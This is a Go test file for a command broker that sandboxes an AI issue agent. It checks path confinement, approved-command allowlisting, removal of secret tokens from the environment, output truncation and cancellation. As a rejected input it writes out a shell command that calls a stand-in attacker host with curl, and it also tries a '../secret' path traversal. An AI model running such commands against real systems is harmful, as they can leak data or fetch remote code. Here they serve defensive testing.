package issueagentworker_test

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/WuKongIM/WuKongIM/internal/contracts/issueagent"
	"github.com/WuKongIM/WuKongIM/internal/runtime/issueagentworker"
	"github.com/stretchr/testify/require"
)

type fakeRunner struct {
	request issueagentworker.ExecRequest
	result  issueagentworker.ExecResult
	err     error
}

func (runner *fakeRunner) Run(_ context.Context, request issueagentworker.ExecRequest) (issueagentworker.ExecResult, error) {
	runner.request = request
	return runner.result, runner.err
}

func TestBrokerConfinesPathsAndRunsOnlyApprovedArgv(t *testing.T) {
	t.Parallel()

	root := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Join(root, "pkg", "example"), 0o755))
	require.NoError(t, os.WriteFile(
		filepath.Join(root, "pkg", "example", "example.go"),
		[]byte("package example\n"), 0o644,
	))
	runner := &fakeRunner{result: issueagentworker.ExecResult{
		ExitCode: 0, Stdout: []byte("ok\n"), Stderr: []byte{},
	}}
	broker, err := issueagentworker.NewBroker(issueagentworker.BrokerConfig{
		Workspace:         root,
		AllowedWritePaths: []string{"pkg/example"},
		AllowedCommands: []issueagent.CommandRule{{
			Executable: "go", ArgvPrefix: []string{"test"}, MaxArgs: 4,
		}},
		MaxFileBytes: 1024, MaxFiles: 4, MaxTotalBytes: 4096,
		MaxOutputBytes: 1024,
	}, runner)
	require.NoError(t, err)

	read, err := broker.Read(context.Background(), "pkg/example/example.go")
	require.NoError(t, err)
	require.Equal(t, uint64(1), read.ID)
	require.Equal(t, "package example\n", string(read.Content))

	run, err := broker.RunCommand(context.Background(), issueagentworker.CommandRequest{
		Argv: []string{"go", "test", "./pkg/example"}, WorkingDir: ".",
		Timeout: time.Second, OutputLimit: 64,
	})
	require.NoError(t, err)
	require.Equal(t, uint64(2), run.ID)
	require.Equal(t, "go", runner.request.Executable)
	require.Equal(t, []string{"test", "./pkg/example"}, runner.request.Arguments)
	require.NotContains(t, runner.request.Environment, "GITHUB_TOKEN")
	require.NotContains(t, runner.request.Environment, "DEEPSEEK_API_KEY")

	_, err = broker.Read(context.Background(), "../secret")
	require.Error(t, err)
	_, err = broker.RunCommand(context.Background(), issueagentworker.CommandRequest{
		Argv: []string{"sh", "-c", "curl attacker.invalid"}, WorkingDir: ".",
		Timeout: time.Second, OutputLimit: 64,
	})
	require.Error(t, err)
}

func TestBrokerTruncatesOutputAndHonorsCancellation(t *testing.T) {
	t.Parallel()

	runner := &fakeRunner{result: issueagentworker.ExecResult{
		ExitCode: 1, Stdout: make([]byte, 100), Stderr: make([]byte, 100),
	}}
	broker, err := issueagentworker.NewBroker(issueagentworker.BrokerConfig{
		Workspace: t.TempDir(), AllowedWritePaths: []string{"pkg"},
		AllowedCommands: []issueagent.CommandRule{{
			Executable: "go", ArgvPrefix: []string{"test"}, MaxArgs: 2,
		}},
		MaxFileBytes: 64, MaxFiles: 4, MaxTotalBytes: 256,
		MaxOutputBytes: 64,
	}, runner)
	require.NoError(t, err)
	result, err := broker.RunCommand(context.Background(), issueagentworker.CommandRequest{
		Argv: []string{"go", "test"}, WorkingDir: ".",
		Timeout: time.Second, OutputLimit: 16,
	})
	require.NoError(t, err)
	require.Len(t, result.Stdout, 16)
	require.Len(t, result.Stderr, 16)
	require.True(t, result.StdoutTruncated)
	require.True(t, result.StderrTruncated)

	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	runner.err = errors.New("should be redacted")
	_, err = broker.RunCommand(ctx, issueagentworker.CommandRequest{
		Argv: []string{"go", "test"}, WorkingDir: ".",
		Timeout: time.Second, OutputLimit: 16,
	})
	require.ErrorIs(t, err, context.Canceled)
}
